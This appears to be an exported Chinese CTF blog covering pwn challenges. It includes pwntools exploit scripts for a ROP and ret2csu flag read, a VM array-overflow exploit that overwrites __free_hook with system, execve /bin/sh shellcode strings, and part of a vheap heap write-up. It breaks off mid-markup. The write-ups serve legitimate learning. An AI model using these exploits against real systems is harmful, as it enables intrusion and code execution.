<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"><span class="keyword">import</span> code</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span> :</span><br><span class="line">	sh = process([<span class="string">b&quot;./ld.so&quot;</span>, <span class="string">b&quot;./pwn&quot;</span>], env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : <span class="string">b&quot;./libc.so.6&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span> :</span><br><span class="line">    sh = process(<span class="string">&quot;./toolkit&quot;</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">	sh = remote(ip, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./toolkit&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(sh, <span class="string">&#x27;b *$rebase(0x292A)&#x27;</span>)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :sh.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> text, data         :sh.sendafter(text, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :sh.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> text, data         :sh.sendlineafter(text, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :sh.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> text               :sh.recvuntil(text)</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(sh.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(sh.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg      = <span class="keyword">lambda</span> s                  :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">lgl     = <span class="keyword">lambda</span> s, value           :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, value))</span><br><span class="line"></span><br><span class="line">sh_x86_18=<span class="string">&quot;\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span></span><br><span class="line">sh_x86_20=<span class="string">&quot;\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span></span><br><span class="line">sh_x64_21=<span class="string">&quot;\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line"><span class="comment">#https://www.exploit-db.com/shellcodes</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------------------------------#</span></span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;[+] &#x27;</span>, <span class="string">b&#x27;14593280&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;Password: &#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x20f</span>)</span><br><span class="line">ru(<span class="string">&#x27;a\n&#x27;</span>)</span><br><span class="line">code_base = u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x1591</span></span><br><span class="line">lg(<span class="string">&#x27;code_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">op = code_base + elf.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">rd = code_base + elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">pt = code_base + elf.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">p_rdi_r = code_base + <span class="number">0x0000000000002933</span></span><br><span class="line">p_rsi_r15_r = code_base + <span class="number">0x0000000000002931</span></span><br><span class="line">ret2csu_1 = code_base + <span class="number">0x000000000000292A</span></span><br><span class="line">ret2csu_2 = code_base + <span class="number">0x0000000000002910</span></span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;[+] &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;[-] &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;Length: &#x27;</span>, <span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pld = <span class="string">b&#x27;/flag\x00\x00\x00&#x27;</span> </span><br><span class="line">pld = pld.ljust(<span class="number">0x130</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">pld += p64(code_base + <span class="number">0x5300</span>)</span><br><span class="line">pld += p64(code_base + <span class="number">0x25e0</span>)</span><br><span class="line">pld = pld.ljust(<span class="number">0x168</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment"># open</span></span><br><span class="line">pld += p64(p_rdi_r) + p64(code_base + <span class="number">0x5060</span>)</span><br><span class="line">pld += p64(p_rsi_r15_r) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">pld += p64(op)</span><br><span class="line"><span class="comment"># read(ret2csu)</span></span><br><span class="line">pld += p64(ret2csu_1)</span><br><span class="line">pld += p64(<span class="number">0</span>)       <span class="comment"># rbx = 0 </span></span><br><span class="line">pld += p64(<span class="number">1</span>)       <span class="comment"># rbp = 1 </span></span><br><span class="line">pld += p64(<span class="number">3</span>)       <span class="comment"># r12 -&gt; edi </span></span><br><span class="line">pld += p64(code_base + <span class="number">0x5070</span>)  <span class="comment"># r13 -&gt; rsi</span></span><br><span class="line">pld += p64(<span class="number">0x30</span>)    <span class="comment"># r14 -&gt; rdx</span></span><br><span class="line">pld += p64(rd)      <span class="comment"># call [r15]</span></span><br><span class="line">pld += p64(ret2csu_2)</span><br><span class="line">pld += <span class="string">b&#x27;a&#x27;</span> * <span class="number">56</span></span><br><span class="line"><span class="comment"># puts</span></span><br><span class="line">pld += p64(p_rdi_r) + p64(code_base + <span class="number">0x5070</span>)</span><br><span class="line">pld += p64(pt)</span><br><span class="line">sla(<span class="string">&#x27;Content: &#x27;</span>, pld)</span><br><span class="line">dbg()</span><br><span class="line">sla(<span class="string">&#x27;Key: &#x27;</span>, <span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>





]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>第五空间</tag>
      </tags>
  </entry>
  <entry>
    <title>Vm Pwn</title>
    <url>/2022/10/09/Pwn/Vm/</url>
    <content><![CDATA[<h2 id="一些心得"><a href="#一些心得" class="headerlink" title="一些心得"></a>一些心得</h2><p>vm技术一开始在逆向的题目中出得比较多，现在开始攻击pwn领域，所以说最核心的是要能够逆清楚程序，怎么逆？我的评价是硬逆。理清楚vm的逻辑后就比较好做了。像这类题目的漏洞大多数是数组溢出的问题。如果还有其他想说的，不过是注意做题时的调试过程，别忘了在添加opcode的同时改动opcode的数量。</p>
<span id="more"></span>

<h2 id="OVM"><a href="#OVM" class="headerlink" title="OVM"></a>OVM</h2><p>一道基础的vmpwn题，存在bss段上的数组溢出，使得我们可以获取bss段上其他变量和got表的地址。注意一点，由于reg数组的类型是<code>DWORD</code>，所以在获取libc地址的时候需要两个reg来存储。</p>
<p>WP如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span> :</span><br><span class="line">	sh = process([<span class="string">b&quot;./ld.so&quot;</span>, <span class="string">b&quot;./pwn&quot;</span>], env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : <span class="string">b&quot;./libc.so.6&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span> :</span><br><span class="line">    sh = process(<span class="string">&quot;./OVM&quot;</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">	sh = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28491</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./OVM&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(sh, <span class="string">&#x27;x/20wx $rebase(0x242060)\n\</span></span><br><span class="line"><span class="string">        x/20wx $rebase(0x202060)\n&#x27;</span>)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :sh.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> text, data         :sh.sendafter(text, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :sh.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> text, data         :sh.sendlineafter(text, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :sh.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> text               :sh.recvuntil(text)</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(sh.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(sh.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg      = <span class="keyword">lambda</span> s                  :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">lgl     = <span class="keyword">lambda</span> s, value           :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, value))</span><br><span class="line"></span><br><span class="line">sh_x86_18=<span class="string">&quot;\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span></span><br><span class="line">sh_x86_20=<span class="string">&quot;\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span></span><br><span class="line">sh_x64_21=<span class="string">&quot;\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line"><span class="comment">#https://www.exploit-db.com/shellcodes</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------------------------------#</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">arg1 = (ipt &amp; 0x0F0000u) &gt;&gt; 16;</span></span><br><span class="line"><span class="string">arg2 = (unsigned __int16)(ipt &amp; 0x0F00) &gt;&gt; 8;</span></span><br><span class="line"><span class="string">arg3 = ipt &amp; 0xF;</span></span><br><span class="line"><span class="string">opcode = HIBYTE(ipt);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x10    reg[arg1] = (unsigned __int8)ipt;</span></span><br><span class="line"><span class="string">0x20    reg[arg1] = ipt == 0;</span></span><br><span class="line"><span class="string">0x30    reg[arg1] = memory[reg[arg3]];                  vul</span></span><br><span class="line"><span class="string">0x40    memory[reg[arg3]] = reg[arg1];                  vul</span></span><br><span class="line"><span class="string">0x50    stack[sp] = reg[arg1]; sp++;                    push reg[arg1]</span></span><br><span class="line"><span class="string">0x60    sp--; reg[arg1] = stack[sp];                    pop reg[arg1]</span></span><br><span class="line"><span class="string">0x70    reg[arg1] = reg[arg3] + reg[arg2];              </span></span><br><span class="line"><span class="string">0x80    reg[arg1] = reg[arg2] - reg[arg3];              </span></span><br><span class="line"><span class="string">0x90    reg[arg1] = reg[arg3] &amp; reg[arg2];              </span></span><br><span class="line"><span class="string">0xA0    reg[arg1] = reg[arg3] | reg[arg2];              </span></span><br><span class="line"><span class="string">0xB0    reg[arg1] = reg[arg3] ^ reg[arg2];</span></span><br><span class="line"><span class="string">0xC0    reg[arg1] = reg[arg2] &lt;&lt; reg[arg3];</span></span><br><span class="line"><span class="string">0xD0    reg[arg1] = reg[arg2] &gt;&gt; reg[arg3];</span></span><br><span class="line"><span class="string">0xE0    exit and printf</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">opcode</span>(<span class="params">func, arg1, arg2, arg3</span>):</span><br><span class="line">    cmd = func &lt;&lt; <span class="number">24</span></span><br><span class="line">    cmd += arg1 &lt;&lt; <span class="number">16</span></span><br><span class="line">    cmd += arg2 &lt;&lt; <span class="number">8</span></span><br><span class="line">    cmd += arg3</span><br><span class="line">    sl(<span class="built_in">str</span>(cmd))</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;PC: &#x27;</span>, <span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;SP: &#x27;</span>, <span class="string">b&#x27;10&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;CODE SIZE: &#x27;</span>, <span class="string">b&#x27;19&#x27;</span>)</span><br><span class="line">ru(<span class="string">&#x27;CODE: &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># reg[2] = high(&amp;stderr)</span></span><br><span class="line"><span class="comment"># reg[3] = low(&amp;stderr)</span></span><br><span class="line">opcode(<span class="number">0x10</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">26</span>)      <span class="comment"># reg[0] = 26</span></span><br><span class="line">opcode(<span class="number">0x80</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>)       <span class="comment"># reg[1] = -26</span></span><br><span class="line">opcode(<span class="number">0x30</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">1</span>)       <span class="comment"># reg[3] = low(&amp;stderr)</span></span><br><span class="line">opcode(<span class="number">0x10</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>)       <span class="comment"># reg[2] = 1</span></span><br><span class="line">opcode(<span class="number">0x70</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>)       <span class="comment"># reg[1] = -25</span></span><br><span class="line">opcode(<span class="number">0x30</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>)       <span class="comment"># reg[2] = high(&amp;stderr)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &amp;stderr -&gt; &amp;__free_hook - 8</span></span><br><span class="line">opcode(<span class="number">0x10</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">0xa0</span>)    <span class="comment"># reg[4] = 0xa0</span></span><br><span class="line">opcode(<span class="number">0x10</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">0x10</span>)    <span class="comment"># reg[5] = 0x10</span></span><br><span class="line">opcode(<span class="number">0x10</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">8</span>)       <span class="comment"># reg[6] = 8</span></span><br><span class="line">opcode(<span class="number">0xc0</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">6</span>)       <span class="comment"># reg[5] = 0x1000</span></span><br><span class="line">opcode(<span class="number">0x70</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">4</span>)       <span class="comment"># reg[3] + 0xa8 = low(&amp;stderr) + 0xa8</span></span><br><span class="line">opcode(<span class="number">0x70</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">5</span>)       <span class="comment"># reg[3] + 0x1000 = low(&amp;stderr) + 0x1000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &amp;comment -&gt; &amp;__free_hook - 8</span></span><br><span class="line">opcode(<span class="number">0x10</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">17</span>)      <span class="comment"># reg[7] = 17</span></span><br><span class="line">opcode(<span class="number">0x70</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">7</span>)       <span class="comment"># reg[1] = -8</span></span><br><span class="line">opcode(<span class="number">0x40</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">1</span>)       <span class="comment"># low(&amp;comment) -&gt; low(&amp;__free_hook - 8)</span></span><br><span class="line">opcode(<span class="number">0x10</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">1</span>)       <span class="comment"># reg[7] = 1</span></span><br><span class="line">opcode(<span class="number">0x70</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">7</span>)       <span class="comment"># reg[1] = -7</span></span><br><span class="line">opcode(<span class="number">0x40</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>)       <span class="comment"># high(&amp;comment) -&gt; high(&amp;__free_hook - 8)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># exit and printf</span></span><br><span class="line">opcode(<span class="number">0xe0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;R2: &#x27;</span>)</span><br><span class="line">high = r(<span class="number">4</span>)</span><br><span class="line">ru(<span class="string">&#x27;R3: &#x27;</span>)</span><br><span class="line">low = r(<span class="number">8</span>)</span><br><span class="line">free_hook = <span class="built_in">int</span>((<span class="string">b&#x27;0x&#x27;</span> + high + low), <span class="number">16</span>) + <span class="number">8</span></span><br><span class="line">lg(<span class="string">&#x27;free_hook&#x27;</span>)</span><br><span class="line">libc_base = free_hook - libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">s(<span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(sys_addr))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="vheap"><a href="#vheap" class="headerlink" title="vheap"></a>vheap</h2><p>开始时存在格式化字符串可以泄露libc地址，之后便是VM环节，在执行的子函数中发现大量无用的opcode语句块，实际我们能够利用的只有opcode为<code>0xa</code>，<code>0xb</code>，<code>0xc</code>这三个，且存在堆溢出的漏洞使我们能够修改fd指针。这里会发现大量的IDA宏定义，可以参照网上的一些解释，但是最好还是看汇编来看我们输入的每个字节都表示什么含义，这样可以避免反编译出现的一些问题，就比如这里如果参照网上的解释就有可能出错，读者可以写一个调试脚本测试，IDA中汇编如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0000000000000</span>EB1                               var_34= dword ptr <span class="number">-34</span>h</span><br><span class="line">.text:<span class="number">0000000000000</span>EB1                               var_24= byte ptr <span class="number">-24</span>h		<span class="comment">// arg2</span></span><br><span class="line">.text:<span class="number">0000000000000</span>EB1                               var_23= byte ptr <span class="number">-23</span>h		<span class="comment">// arg1</span></span><br><span class="line">.text:<span class="number">0000000000000</span>EB1                               var_22= byte ptr <span class="number">-22</span>h		<span class="comment">// dest </span></span><br><span class="line">.text:<span class="number">0000000000000</span>EB1                               var_21= byte ptr <span class="number">-21</span>h		<span class="comment">// opcode</span></span><br><span class="line">.text:<span class="number">0000000000000</span>EB1                               var_20= qword ptr <span class="number">-20</span>h</span><br><span class="line">.text:<span class="number">0000000000000</span>EB1                               var_18= qword ptr <span class="number">-18</span>h</span><br><span class="line"></span><br><span class="line"><span class="number">17</span>:       reg[SBYTE2(memeory)] = reg[SBYTE1(memeory)] ^ reg[(<span class="type">char</span>)memeory];</span><br><span class="line">.text:<span class="number">0000000000000F</span>57 <span class="number">48</span> <span class="number">8</span>D <span class="number">05</span> A2 <span class="number">1</span>D <span class="number">20</span> <span class="number">00</span>          lea     rax, reg</span><br><span class="line">.text:<span class="number">0000000000000F</span>5E <span class="number">48</span> <span class="number">89</span> <span class="number">45</span> E0                   mov     [rbp+var_20], rax	<span class="comment">// reg	</span></span><br><span class="line">.text:<span class="number">0000000000000F</span>62 <span class="number">0F</span> BE <span class="number">45</span> DC                   movsx   eax, [rbp+var_24]	<span class="comment">// reg[(char)memeory]</span></span><br><span class="line">.text:<span class="number">0000000000000F</span>66 <span class="number">48</span> <span class="number">98</span>                         cdqe</span><br><span class="line">.text:<span class="number">0000000000000F</span>68 <span class="number">48</span> <span class="number">8</span>D <span class="number">14</span> C5 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       lea     rdx, ds:<span class="number">0</span>[rax*<span class="number">8</span>]</span><br><span class="line">.text:<span class="number">0000000000000F</span>70 <span class="number">48</span> <span class="number">8</span>D <span class="number">05</span> <span class="number">89</span> <span class="number">1</span>D <span class="number">20</span> <span class="number">00</span>          lea     rax, reg</span><br><span class="line">.text:<span class="number">0000000000000F</span>77 <span class="number">48</span> <span class="number">8B</span> <span class="number">0</span>C <span class="number">02</span>                   mov     rcx, [rdx+rax]</span><br><span class="line">.text:<span class="number">0000000000000F</span>7B <span class="number">0F</span> BE <span class="number">45</span> DD                   movsx   eax, [rbp+var_23]	<span class="comment">// SBYTE1(memeory)</span></span><br><span class="line">.text:<span class="number">0000000000000F</span>7F <span class="number">48</span> <span class="number">98</span>                         cdqe</span><br><span class="line">.text:<span class="number">0000000000000F</span>81 <span class="number">48</span> <span class="number">8</span>D <span class="number">14</span> C5 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       lea     rdx, ds:<span class="number">0</span>[rax*<span class="number">8</span>]</span><br><span class="line">.text:<span class="number">0000000000000F</span>89 <span class="number">48</span> <span class="number">8</span>D <span class="number">05</span> <span class="number">70</span> <span class="number">1</span>D <span class="number">20</span> <span class="number">00</span>          lea     rax, reg</span><br><span class="line">.text:<span class="number">0000000000000F</span>90 <span class="number">48</span> <span class="number">8B</span> <span class="number">14</span> <span class="number">02</span>                   mov     rdx, [rdx+rax]</span><br><span class="line">.text:<span class="number">0000000000000F</span>94 <span class="number">0F</span> BE <span class="number">45</span> DE                   movsx   eax, [rbp+var_22]	<span class="comment">// SBYTE2(memeory)</span></span><br><span class="line">.text:<span class="number">0000000000000F</span>98 <span class="number">48</span> <span class="number">31</span> D1                      xor     rcx, rdx</span><br><span class="line">.text:<span class="number">0000000000000F</span>9B <span class="number">48</span> <span class="number">98</span>                         cdqe</span><br><span class="line">.text:<span class="number">0000000000000F</span>9D <span class="number">48</span> <span class="number">8</span>D <span class="number">14</span> C5 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       lea     rdx, ds:<span class="number">0</span>[rax*<span class="number">8</span>]</span><br><span class="line">.text:<span class="number">0000000000000F</span>A5 <span class="number">48</span> <span class="number">8</span>D <span class="number">05</span> <span class="number">54</span> <span class="number">1</span>D <span class="number">20</span> <span class="number">00</span>          lea     rax, reg</span><br><span class="line">.text:<span class="number">0000000000000F</span>AC <span class="number">48</span> <span class="number">89</span> <span class="number">0</span>C <span class="number">02</span>                   mov     [rdx+rax], rcx</span><br></pre></td></tr></table></figure>

<p>WP如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span> :</span><br><span class="line">	sh = process([<span class="string">b&quot;./ld.so&quot;</span>, <span class="string">b&quot;./pwn&quot;</span>], env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : <span class="string">b&quot;./libc.so.6&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span> :</span><br><span class="line">    sh = process(<span class="string">&quot;./vheap&quot;</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">	sh = remote(ip, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./vheap&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(sh, <span class="string">&#x27;b *$rebase(0xEAF)&#x27;</span>)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :sh.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> text, data         :sh.sendafter(text, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :sh.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> text, data         :sh.sendlineafter(text, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :sh.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> text               :sh.recvuntil(text)</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(sh.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(sh.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg      = <span class="keyword">lambda</span> s                  :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">lgl     = <span class="keyword">lambda</span> s, value           :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, value))</span><br><span class="line"></span><br><span class="line">sh_x86_18=<span class="string">&quot;\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span></span><br><span class="line">sh_x86_20=<span class="string">&quot;\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span></span><br><span class="line">sh_x64_21=<span class="string">&quot;\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line"><span class="comment">#https://www.exploit-db.com/shellcodes</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------------------------------#</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0xa         ptr_global + arg2 = malloc(arg1)</span></span><br><span class="line"><span class="string">0xb         memcpy(ptr_global + arg2, data_piece + dest, 0x40)</span></span><br><span class="line"><span class="string">0xc         free(ptr_global + arg2); ptr_global + arg2 = 0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">dbg:</span></span><br><span class="line"><span class="string">x/5gx $rebase(0x202060)         # ptr_global</span></span><br><span class="line"><span class="string">x/20gx $rebase(0x2020E0)        # data_pieces</span></span><br><span class="line"><span class="string">x/10gx $rebase(0x202500)        # memory</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">one_gadget:</span></span><br><span class="line"><span class="string">0x4f2a5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rsp &amp; 0xf == 0</span></span><br><span class="line"><span class="string">  rcx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4f302 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x40] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x10a2fc execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span 